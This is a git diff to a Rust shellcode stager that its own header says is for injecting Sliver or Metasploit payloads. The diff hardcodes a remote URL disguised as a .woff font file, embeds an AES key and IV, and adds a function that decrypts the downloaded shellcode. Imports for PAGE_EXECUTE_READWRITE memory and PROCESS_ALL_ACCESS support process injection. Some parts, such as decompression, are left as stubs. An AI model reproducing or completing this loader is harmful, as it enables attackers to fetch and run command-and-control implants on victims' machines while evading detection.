@@ -1,13 +1,18 @@
 // Implement a stager for Shellcode Injection of Sliver or Metasploit Shellcode
-use std::process::exit;
-use bytes::Bytes;
-
 extern crate kernel32;
+use aes::{Aes128, Aes256, NewBlockCipher};
+use block_modes::{BlockMode, Cbc};
+use block_modes::block_padding::NoPadding;
+use bytes::Bytes;
 use clap::Parser;
-use std::ptr;
-
+use std::{ptr, process::exit};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
+
+const URL: &str = "http://192.168.8.111:8443/test.woff";
+
+const AESKEY: &str = "oPqVTb-ieogwPT94";
+const AESIV: &str  = "lbzPx4uGUpAx7Wap";
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -21,9 +26,6 @@ struct Args {
     #[arg(short, long, required = false)]
     compression: Vec<String>,
 
-    #[arg(short, long)]
-    encryption: String,
-
     #[arg(short = 'k', long)]
     aes_key: String,
 
@@ -31,15 +33,37 @@ struct Args {
     aes_iv: String,
 }
 
-fn download_and_execute(url: String) {
+fn download_and_execute(url: String, binary:String, compression: String, aes_key: String, aes_iv: String) {
     // Download Shellcode from stage-listener
-    let stage_one = download_shellcode_from_url(url);
-    println!("Downloaded Shellcode: {} bytes", stage_one.len());
-
+    let downloaded = download_shellcode_from_url(url);
+    println!("Downloaded Shellcode: {} bytes", downloaded.len());
+    // Decrypt Shellcode
+    let decrypted = decrypt(&downloaded, aes_key.as_bytes(), aes_iv.as_bytes());
+    // Decompress Shellcode
 }
 
 fn decompress() {}
-fn decrypt() {}
+
+
+fn decrypt(ciphertext: &[u8], aes_key: &[u8], aes_iv: &[u8]) -> Result<Vec<u8>, &'static str> {
+    // Choose the AES type based on the key length (128 or 256 bits)
+    let cipher = Cbc::<Aes256, NoPadding>::new_from_slices(aes_key, aes_iv);
+
+    // Check if the cipher was created successfully
+    let cipher = match cipher {
+        Ok(c) => c,
+        Err(_) => return Err("Failed to create cipher"),
+    };
+
+    // Initialize the CBC mode with NoPadding
+    let mut buffer = ciphertext.to_vec();
+    
+    let decrypted = cipher.decrypt(&mut buffer)
+        .map_err(|_| "Decryption failed")?;
+
+    // Return the decrypted data as a Vec<u8>
+    Ok(decrypted.to_vec())
+}
 
 fn download_shellcode_from_url(url: String) -> Bytes {
     let client = reqwest::blocking::Client::builder()
@@ -76,7 +100,7 @@ fn main() {
     let args = Args::parse();
 
     println!("Hello {}!", args.url);
-    download_and_execute(args.url);
+    download_and_execute(args.url, args.binary, "Hello".to_string(), args.aes_key, args.aes_iv);
 
     //Download shellcode stage and execute process injection
     // let shellcode_url: &str = "http://x.x.x.x/fontawesome.woff";
